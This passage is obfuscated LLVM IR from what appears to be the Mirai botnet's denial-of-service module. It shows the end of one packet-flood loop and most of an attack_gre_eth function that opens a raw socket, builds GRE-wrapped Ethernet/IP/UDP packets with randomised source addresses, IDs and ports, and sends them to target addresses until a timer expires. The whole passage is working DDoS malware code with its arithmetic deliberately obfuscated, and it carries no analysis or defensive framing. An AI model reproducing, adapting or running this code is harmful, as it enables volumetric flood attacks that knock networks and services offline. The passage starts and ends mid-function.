  %518 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %519 = load i32, i32* %11, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %518, i64 %520
  %522 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %521, i32 0, i32 0
  %523 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %522, i32 0, i32 0
  store i16 2, i16* %523, align 4
  %524 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %525 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %524, i32 0, i32 9
  %526 = load i32, i32* %525, align 4
  %527 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %528 = load i32, i32* %11, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %527, i64 %529
  %531 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %530, i32 0, i32 0
  %532 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %531, i32 0, i32 2
  %533 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %532, i32 0, i32 0
  store i32 %526, i32* %533, align 4
  %534 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %535 = load i32, i32* %11, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %534, i64 %536
  %538 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %537, i32 0, i32 0
  %539 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %538, i32 0, i32 1
  store i16 0, i16* %539, align 2
  %540 = load i32, i32* %12, align 4
  %541 = load i8*, i8** %29, align 8
  %542 = load i32, i32* %20, align 4
  %543 = sext i32 %542 to i64
  %544 = sub i64 0, 52
  %545 = sub i64 0, %543
  %546 = add i64 %544, %545
  %547 = sub i64 0, %546
  %548 = add i64 52, %543
  %549 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %550 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %551 = load i32, i32* %11, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %550, i64 %552
  %554 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %553, i32 0, i32 0
  %555 = bitcast %struct.sockaddr_in* %554 to %struct.sockaddr*
  store %struct.sockaddr* %555, %struct.sockaddr** %549, align 8
  %556 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %557 = load %struct.sockaddr*, %struct.sockaddr** %556, align 8
  %558 = call i64 @sendto(i32 %540, i8* %541, i64 %547, i32 16384, %struct.sockaddr* %557, i32 16)
  br label %559

; <label>:559:                                    ; preds = %485
  %560 = load i32, i32* %11, align 4
  %561 = sub i32 0, %560
  %562 = sub i32 0, 1
  %563 = add i32 %561, %562
  %564 = sub i32 0, %563
  %565 = add nsw i32 %560, 1
  store i32 %564, i32* %11, align 4
  br label %339

; <label>:566:                                    ; preds = %339
  %567 = call i64 @time(i64* null) #6
  %568 = load i32, i32* %24, align 4
  %569 = sext i32 %568 to i64
  %570 = icmp sgt i64 %567, %569
  br i1 %570, label %571, label %572

; <label>:571:                                    ; preds = %566
  br label %573

; <label>:572:                                    ; preds = %566
  br label %338

; <label>:573:                                    ; preds = %571, %96, %90
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 19, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = sub i64 0, %87
  %91 = sub i64 0, %89
  %92 = add i64 %90, %91
  %93 = sub i64 0, %92
  %94 = add nsw i64 %87, %89
  %95 = trunc i64 %93 to i32
  store i32 %95, i32* %24, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %12, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %5
  br label %586

; <label>:99:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %100 = load i32, i32* %12, align 4
  %101 = bitcast i32* %11 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %12, align 4
  %106 = call i32 @close(i32 %105)
  br label %586

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %11, align 4
  br label %108

; <label>:108:                                    ; preds = %318, %107
  %109 = load i32, i32* %11, align 4
  %110 = load i8, i8* %7, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %325

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %25, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.grehdr*
  store %struct.grehdr* %127, %struct.grehdr** %26, align 8
  %128 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %129 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %128, i64 1
  %130 = bitcast %struct.grehdr* %129 to %struct.ethhdr*
  store %struct.ethhdr* %130, %struct.ethhdr** %27, align 8
  %131 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %132 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %131, i64 1
  %133 = bitcast %struct.ethhdr* %132 to %struct.iphdr*
  store %struct.iphdr* %133, %struct.iphdr** %28, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i64 1
  %136 = bitcast %struct.iphdr* %135 to %struct.udphdr*
  store %struct.udphdr* %136, %struct.udphdr** %29, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %138 = bitcast %struct.iphdr* %137 to i8*
  %139 = load i8, i8* %138, align 4
  %140 = xor i8 15, -1
  %141 = xor i8 %139, %140
  %142 = and i8 %141, %139
  %143 = and i8 %139, 15
  %144 = and i8 %142, 64
  %145 = xor i8 %142, 64
  %146 = or i8 %144, %145
  %147 = or i8 %142, 64
  store i8 %146, i8* %138, align 4
  %148 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %149 = bitcast %struct.iphdr* %148 to i8*
  %150 = load i8, i8* %149, align 4
  %151 = xor i8 %150, -1
  %152 = xor i8 -16, -1
  %153 = xor i8 40, -1
  %154 = or i8 %151, %152
  %155 = or i8 40, %153
  %156 = xor i8 %154, -1
  %157 = and i8 %156, %155
  %158 = and i8 %150, -16
  %159 = and i8 %157, 5
  %160 = xor i8 %157, 5
  %161 = or i8 %159, %160
  %162 = or i8 %157, 5
  store i8 %161, i8* %149, align 4
  %163 = load i8, i8* %14, align 1
  %164 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 1
  store i8 %163, i8* %165, align 1
  %166 = load i32, i32* %20, align 4
  %167 = sext i32 %166 to i64
  %168 = sub i64 66, 8162537906749976268
  %169 = add i64 %168, %167
  %170 = add i64 %169, 8162537906749976268
  %171 = add i64 66, %167
  %172 = trunc i64 %170 to i16
  %173 = call zeroext i16 @htons(i16 zeroext %172) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 2
  store i16 %173, i16* %175, align 2
  %176 = load i16, i16* %15, align 2
  %177 = call zeroext i16 @htons(i16 zeroext %176) #7
  %178 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 3
  store i16 %177, i16* %179, align 4
  %180 = load i8, i8* %16, align 1
  %181 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 5
  store i8 %180, i8* %182, align 4
  %183 = load i8, i8* %17, align 1
  %184 = icmp ne i8 %183, 0
  br i1 %184, label %185, label %189

; <label>:185:                                    ; preds = %113
  %186 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 4
  store i16 %186, i16* %188, align 2
  br label %189

; <label>:189:                                    ; preds = %185, %113
  %190 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 6
  store i8 47, i8* %191, align 1
  %192 = load i32, i32* %23, align 4
  %193 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 8
  store i32 %192, i32* %194, align 4
  %195 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %196 = load i32, i32* %11, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %195, i64 %197
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i32 0, i32 1
  %200 = load i32, i32* %199, align 4
  %201 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 9
  store i32 %200, i32* %202, align 4
  %203 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %204 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %205 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %204, i32 0, i32 1
  store i16 %203, i16* %205, align 2
  %206 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %207 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %208 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %207, i32 0, i32 2
  store i16 %206, i16* %208, align 1
  %209 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %210 = bitcast %struct.iphdr* %209 to i8*
  %211 = load i8, i8* %210, align 4
  %212 = xor i8 15, -1
  %213 = xor i8 %211, %212
  %214 = and i8 %213, %211
  %215 = and i8 %211, 15
  %216 = and i8 %214, 64
  %217 = xor i8 %214, 64
  %218 = or i8 %216, %217
  %219 = or i8 %214, 64
  store i8 %218, i8* %210, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %221 = bitcast %struct.iphdr* %220 to i8*
  %222 = load i8, i8* %221, align 4
  %223 = xor i8 -16, -1
  %224 = xor i8 %222, %223
  %225 = and i8 %224, %222
  %226 = and i8 %222, -16
  %227 = and i8 %225, 5
  %228 = xor i8 %225, 5
  %229 = or i8 %227, %228
  %230 = or i8 %225, 5
  store i8 %229, i8* %221, align 4
  %231 = load i8, i8* %14, align 1
  %232 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 1
  store i8 %231, i8* %233, align 1
  %234 = load i32, i32* %20, align 4
  %235 = sext i32 %234 to i64
  %236 = sub i64 0, %235
  %237 = sub i64 28, %236
  %238 = add i64 28, %235
  %239 = trunc i64 %237 to i16
  %240 = call zeroext i16 @htons(i16 zeroext %239) #7
  %241 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 2
  store i16 %240, i16* %242, align 2
  %243 = load i16, i16* %15, align 2
  %244 = zext i16 %243 to i32
  %245 = xor i32 %244, -1
  %246 = and i32 -188601982, %245
  %247 = xor i32 -188601982, -1
  %248 = and i32 %244, %247
  %249 = xor i32 -1, -1
  %250 = and i32 %249, -188601982
  %251 = and i32 -1, %247
  %252 = or i32 %246, %248
  %253 = or i32 %250, %251
  %254 = xor i32 %252, %253
  %255 = xor i32 %244, -1
  %256 = trunc i32 %254 to i16
  %257 = call zeroext i16 @htons(i16 zeroext %256) #7
  %258 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 3
  store i16 %257, i16* %259, align 4
  %260 = load i8, i8* %16, align 1
  %261 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 5
  store i8 %260, i8* %262, align 4
  %263 = load i8, i8* %17, align 1
  %264 = icmp ne i8 %263, 0
  br i1 %264, label %265, label %269

; <label>:265:                                    ; preds = %189
  %266 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %267 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 4
  store i16 %266, i16* %268, align 2
  br label %269

; <label>:269:                                    ; preds = %265, %189
  %270 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 6
  store i8 17, i8* %271, align 1
  %272 = call i32 @rand_next()
  %273 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 8
  store i32 %272, i32* %274, align 4
  %275 = load i8, i8* %22, align 1
  %276 = icmp ne i8 %275, 0
  br i1 %276, label %277, label %283

; <label>:277:                                    ; preds = %269
  %278 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i32 0, i32 9
  %280 = load i32, i32* %279, align 4
  %281 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 9
  store i32 %280, i32* %282, align 4
  br label %299

; <label>:283:                                    ; preds = %269
  %284 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 8
  %286 = load i32, i32* %285, align 4
  %287 = add i32 %286, -1392375756
  %288 = sub i32 %287, 1024
  %289 = sub i32 %288, -1392375756
  %290 = sub i32 %286, 1024
  %291 = xor i32 %289, -1
  %292 = and i32 -1, %291
  %293 = xor i32 -1, -1
  %294 = and i32 %289, %293
  %295 = or i32 %292, %294
  %296 = xor i32 %289, -1
  %297 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 9
  store i32 %295, i32* %298, align 4
  br label %299

; <label>:299:                                    ; preds = %283, %277
  %300 = load i16, i16* %18, align 2
  %301 = call zeroext i16 @htons(i16 zeroext %300) #7
  %302 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 0
  store i16 %301, i16* %303, align 2
  %304 = load i16, i16* %19, align 2
  %305 = call zeroext i16 @htons(i16 zeroext %304) #7
  %306 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 1
  store i16 %305, i16* %307, align 2
  %308 = load i32, i32* %20, align 4
  %309 = sext i32 %308 to i64
  %310 = add i64 8, 6729199422140928538
  %311 = add i64 %310, %309
  %312 = sub i64 %311, 6729199422140928538
  %313 = add i64 8, %309
  %314 = trunc i64 %312 to i16
  %315 = call zeroext i16 @htons(i16 zeroext %314) #7
  %316 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i32 0, i32 2
  store i16 %315, i16* %317, align 2
  br label %318

; <label>:318:                                    ; preds = %299
  %319 = load i32, i32* %11, align 4
  %320 = sub i32 0, %319
  %321 = sub i32 0, 1
  %322 = add i32 %320, %321
  %323 = sub i32 0, %322
  %324 = add nsw i32 %319, 1
  store i32 %323, i32* %11, align 4
  br label %108

; <label>:325:                                    ; preds = %108
  br label %326

; <label>:326:                                    ; preds = %585, %325
  store i32 0, i32* %11, align 4
  br label %327

; <label>:327:                                    ; preds = %574, %326
  %328 = load i32, i32* %11, align 4
  %329 = load i8, i8* %7, align 1
  %330 = zext i8 %329 to i32
  %331 = icmp slt i32 %328, %330
  br i1 %331, label %332, label %579

; <label>:332:                                    ; preds = %327
  %333 = load i8**, i8*** %13, align 8
  %334 = load i32, i32* %11, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds i8*, i8** %333, i64 %335
  %337 = load i8*, i8** %336, align 8
  store i8* %337, i8** %33, align 8
  %338 = load i8*, i8** %33, align 8
  %339 = bitcast i8* %338 to %struct.iphdr*
  store %struct.iphdr* %339, %struct.iphdr** %34, align 8
  %340 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i64 1
  %342 = bitcast %struct.iphdr* %341 to %struct.grehdr*
  store %struct.grehdr* %342, %struct.grehdr** %35, align 8
  %343 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %344 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %343, i64 1
  %345 = bitcast %struct.grehdr* %344 to %struct.ethhdr*
  store %struct.ethhdr* %345, %struct.ethhdr** %36, align 8
  %346 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %347 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %346, i64 1
  %348 = bitcast %struct.ethhdr* %347 to %struct.iphdr*
  store %struct.iphdr* %348, %struct.iphdr** %37, align 8
  %349 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i64 1
  %351 = bitcast %struct.iphdr* %350 to %struct.udphdr*
  store %struct.udphdr* %351, %struct.udphdr** %38, align 8
  %352 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %353 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %352, i64 1
  %354 = bitcast %struct.udphdr* %353 to i8*
  store i8* %354, i8** %39, align 8
  %355 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %356 = load i32, i32* %11, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %355, i64 %357
  %359 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %358, i32 0, i32 2
  %360 = load i8, i8* %359, align 4
  %361 = zext i8 %360 to i32
  %362 = icmp slt i32 %361, 32
  br i1 %362, label %363, label %388

; <label>:363:                                    ; preds = %332
  %364 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %365 = load i32, i32* %11, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %364, i64 %366
  %368 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i32 0, i32 1
  %369 = load i32, i32* %368, align 4
  %370 = call i32 @ntohl(i32 %369) #7
  %371 = call i32 @rand_next()
  %372 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %373 = load i32, i32* %11, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %372, i64 %374
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %375, i32 0, i32 2
  %377 = load i8, i8* %376, align 4
  %378 = zext i8 %377 to i32
  %379 = lshr i32 %371, %378
  %380 = sub i32 0, %370
  %381 = sub i32 0, %379
  %382 = add i32 %380, %381
  %383 = sub i32 0, %382
  %384 = add i32 %370, %379
  %385 = call i32 @htonl(i32 %383) #7
  %386 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 9
  store i32 %385, i32* %387, align 4
  br label %388

; <label>:388:                                    ; preds = %363, %332
  %389 = load i32, i32* %23, align 4
  %390 = icmp eq i32 %389, -1
  br i1 %390, label %391, label %395

; <label>:391:                                    ; preds = %388
  %392 = call i32 @rand_next()
  %393 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 8
  store i32 %392, i32* %394, align 4
  br label %395

; <label>:395:                                    ; preds = %391, %388
  %396 = load i16, i16* %15, align 2
  %397 = zext i16 %396 to i32
  %398 = icmp eq i32 %397, 65535
  br i1 %398, label %399, label %425

; <label>:399:                                    ; preds = %395
  %400 = call i32 @rand_next()
  %401 = xor i32 65535, -1
  %402 = xor i32 %400, %401
  %403 = and i32 %402, %400
  %404 = and i32 %400, 65535
  %405 = trunc i32 %403 to i16
  %406 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 3
  store i16 %405, i16* %407, align 4
  %408 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 3
  %410 = load i16, i16* %409, align 4
  %411 = zext i16 %410 to i32
  %412 = add i32 %411, -1325126725
  %413 = sub i32 %412, 1000
  %414 = sub i32 %413, -1325126725
  %415 = sub nsw i32 %411, 1000
  %416 = xor i32 %414, -1
  %417 = and i32 -1, %416
  %418 = xor i32 -1, -1
  %419 = and i32 %414, %418
  %420 = or i32 %417, %419
  %421 = xor i32 %414, -1
  %422 = trunc i32 %420 to i16
  %423 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 3
  store i16 %422, i16* %424, align 4
  br label %425

; <label>:425:                                    ; preds = %399, %395
  %426 = load i16, i16* %18, align 2
  %427 = zext i16 %426 to i32
  %428 = icmp eq i32 %427, 65535
  br i1 %428, label %429, label %442

; <label>:429:                                    ; preds = %425
  %430 = call i32 @rand_next()
  %431 = xor i32 %430, -1
  %432 = xor i32 65535, -1
  %433 = xor i32 -619107044, -1
  %434 = or i32 %431, %432
  %435 = or i32 -619107044, %433
  %436 = xor i32 %434, -1
  %437 = and i32 %436, %435
  %438 = and i32 %430, 65535
  %439 = trunc i32 %437 to i16
  %440 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %441 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %440, i32 0, i32 0
  store i16 %439, i16* %441, align 2
  br label %442

; <label>:442:                                    ; preds = %429, %425
  %443 = load i16, i16* %19, align 2
  %444 = zext i16 %443 to i32
  %445 = icmp eq i32 %444, 65535
  br i1 %445, label %446, label %455

; <label>:446:                                    ; preds = %442
  %447 = call i32 @rand_next()
  %448 = xor i32 65535, -1
  %449 = xor i32 %447, %448
  %450 = and i32 %449, %447
  %451 = and i32 %447, 65535
  %452 = trunc i32 %450 to i16
  %453 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %454 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %453, i32 0, i32 1
  store i16 %452, i16* %454, align 2
  br label %455

; <label>:455:                                    ; preds = %446, %442
  %456 = load i8, i8* %22, align 1
  %457 = icmp ne i8 %456, 0
  br i1 %457, label %462, label %458

; <label>:458:                                    ; preds = %455
  %459 = call i32 @rand_next()
  %460 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 9
  store i32 %459, i32* %461, align 4
  br label %468

; <label>:462:                                    ; preds = %455
  %463 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 9
  %465 = load i32, i32* %464, align 4
  %466 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %467 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %466, i32 0, i32 9
  store i32 %465, i32* %467, align 4
  br label %468

; <label>:468:                                    ; preds = %462, %458
  %469 = call i32 @rand_next()
  store i32 %469, i32* %40, align 4
